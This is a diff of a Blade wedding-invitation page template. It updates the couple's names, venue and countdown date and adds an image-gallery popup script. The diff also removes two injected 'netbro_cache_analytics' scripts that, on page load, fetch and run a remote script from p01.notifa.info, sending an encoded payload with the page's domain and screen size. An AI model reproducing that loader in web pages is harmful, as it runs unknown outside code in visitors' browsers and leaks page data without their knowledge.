@@ -5,17 +5,15 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
     <meta name="apple-mobile-web-app-status-bar-style" content="black">
-
-    <meta property="og:image" content="{{ asset('/images/imagelink/13.jpg') }}"> 
-    <meta property="og:title" content="Wedding of Putri & Andre" />
-    <meta property="og:description" content="Gedung Pewayangan Kautaman, 17 | MARET | 2018.">
-    <meta property="og:type" content="article" />   
-    <meta property="og:url" content=""/>
-
-    <link rel="shortcut icon" href="{{ asset('wedding-5/images/favicon.png') }}">
-    <link href="{{ asset('wedding-5/images/apple_touch_icon_72x72.png') }}" media="(device-width: 320px)" rel="apple-touch-startup-image">
-    <link href="{{ asset('wedding-5/images/apple_touch_icon_114x114.png') }}" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
-    <title>Putri & Andre Wedding - by halalindong.com</title>
+    <meta property="og:image" content="">
+    <meta property="og:title" content="Wedding of Fajar & Senja" />
+    <meta property="og:description" content="Gedung Puri Begawan Bogor, 27 | December | 2019.">
+    <meta property="og:type" content="article" />
+    <link rel="shortcut icon" href="{{asset('images/pandawalogo.jpg')}}">
+    <meta property="og:url" content="" />
+    <link href="{{ asset('wedding/images/apple_touch_icon_72x72.png') }}" media="(device-width: 320px)" rel="apple-touch-startup-image">
+    <link href="{{ asset('wedding/images/apple_touch_icon_114x114.png') }}" media="(device-width: 320px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+    <title>Fajar - Senja pandawa.tech</title>
     <link rel="stylesheet" href="{{ asset('wedding-5/css/framework7.css') }}">
     <link rel="stylesheet" href="{{ asset('wedding-5/css/style.css') }}">
     <link type="text/css" rel="stylesheet" href="{{ asset('wedding-5/css/swipebox.css') }}" />
@@ -104,28 +102,50 @@
                 @include('wedding-5.video')
                 @include('wedding-5.gallery')
             </div>
+            <div class="music-box">
+              <button class="music-box-toggle-btn">
+                  <audio id='song' loop>
+                    <source src="{{ asset('wedding-5/music/andra_love_can_save_it_all.mp3') }}">
+                  </audio>  
+
+                  <button type="button" class="music" id="mute-sound" >
+                    <i class="fa fa-music"></i>
+                  </button>
+                  <button type="button" class="music" id="unmute-sound" >
+                    <i class="fa fa-microphone-slash"></i>
+                  </button> 
+              </button>
+          </div>
         </div>
     </div>
 
-<div class="music-box">
-    <button class="music-box-toggle-btn">
-        <audio id='song' loop>
-          <source src="{{ asset('wedding-5/music/andra_love_can_save_it_all.mp3') }}">
-        </audio>  
-
-        <button type="button" class="music" id="mute-sound" >
-          <i class="fa fa-music"></i>
-        </button>
-        <button type="button" class="music" id="unmute-sound" >
-          <i class="fa fa-microphone-slash"></i>
-        </button> 
-    </button>
-</div>
 
 
-<script type="text/javascript" src="{{ asset('wedding-3/js/jquery-1.10.1.min.js') }}"></script>
+<script type="text/javascript" src="{{ asset('wedding-5/js/jquery-1.10.1.min.js') }}"></script>
 <script type="text/javascript" src="{{asset('js/jquery.magnific-popup.min.js')}}"></script>
-
+<script>
+    $('.with-caption').magnificPopup({
+        type: 'image',
+        closeBtnInside: false,
+        mainClass: 'mfp-with-zoom mfp-img-mobile',
+        image: {
+            verticalFit: true,
+            titleSrc: function(item) {
+                var caption = item.el.attr('title');
+                return caption;
+            }
+        },
+        gallery: {
+            enabled: true
+        },
+        callbacks: {
+            open: function() {
+                this.wrap.on('click.pinhandler', '.pin-it', function(e) {});
+            },
+            beforeClose: function() {}
+      }
+    });
+</script>
 <script>
 	document.getElementById('mute-sound').style.display = 'none';
     document.getElementById('unmute-sound').addEventListener('click', function(event){
@@ -155,7 +175,7 @@
 function pindahMenu(tujuan) {
     var active = $('#content').find('.active').attr('id');
     var tujuan = tujuan;
-    console.log(tujuan);
+    console.log(tujuan); 
     $("#" + active).removeClass('animated flip active');
     $("#" + active).addClass('hidden');
     $("#" + tujuan).removeClass('hidden');
@@ -167,7 +187,7 @@ function pindahMenu(tujuan) {
 <script>
     function makeTimer() {
 
-      var endTime = new Date("");     
+      var endTime = new Date("December 27, 2019 08:00:00");     
       var endTime = (Date.parse(endTime)) / 1000;
 
       var now = new Date();
@@ -192,8 +212,6 @@ function pindahMenu(tujuan) {
 
   setInterval(function() { makeTimer(); }, 1000);
 </script>
-  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5m4AsOAl%2bDG5ffILjqNGoqiZVBqv%2fMysxuzQRe7na8BzbBrzyi4cs%2bEtSkZvtYNGqW3l%2fBFx8lPBRyVkzL3TtdL1LxuC4cx1ZtCTi7SqtZ6e3oZaNkhBpw8B2nIehV8qoudrqgGZlGEPMKEjFVlaw7TGr917IS2oYE8tqNMczZa4i5xdwukFAphfdNEx6JL5eF5UsYIAa2jb5VPokTwcxN4ny%2fC7rg9pNLkdXNG4An%2fwO3coC5DK8Cf3hTiP4bovu5J7kqqybEBN7mITtBQvNKeTjfSffFGLdlSjZs8xQAQsWEW1QgTvKULE4eWVmhvf97nkW5wTIkqCctgGPC0uR47NImFmCf%2bWVpbh90RZ0%2fq6vwbTcmegr1%2fnhFX7kXRM1htyhHLPiqccSVHdtasvh%2bBwMkUvK1wQ8OWmfiIsV%2bik1NBabMxSu8YbUaYtGVsVpI4fW1OdTHuyc0jasAWLpkJj8%2bY03ocrw%2fedT53bsI30RMm4LRGnLUBQNcgMwHpwUMvdTRAE8QUnuzTrtO2GK5GkChOlcvKkuX9NXQptu77dpQ8zXzUTI0LQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
-  </script>
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2GL9VkzwiM1F9DyydHIlQEflQ0XvdimWJiOFxzgvDLSSEO4pT4jLEX5TlbgvsFuV0BFb2SAOai1uO5WiaKj0bIE%2bEPUzeNO%2fQZ8GflFdgsY%2f5lcuGbyEeKEim3sdrg850vJ3XCT%2fhh%2bY%2bmM1ssyf5NTNTG0t6c5a9FR5GmDQIMad3kOgxeKUOp3JH78wyrLANFOw7xWW0H%2btjF2vvuhN9d%2bNpTBJMsJElu2%2fGRp5nQRNYtA6xCvxmDnGOofuZG3YbbM9ZsqNyin9RWjCFnNpsykuSdg6mSg3tXxiS4WGyVaCjuToJj%2bMJiyvJNx9hsO1QvnPQlgKlQYoi%2ftyicTGmJ%2bC4F557Q1%2bz4PEBDg%2fZGywLqIT42A0KVT1Nt6UtVou5r6pqgo5wLdvEItqO7PtDm4gIL%2fgk3gl8YNh9XpdhAJmJQ8DLaWdPuTj1I%2bfAoP3rjcTNyLVgUkIe%2fgG2ROksIhhyYTjZBgcGAY63kS1ypg21LiacjvFKsA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+ </body>
 
 </html>
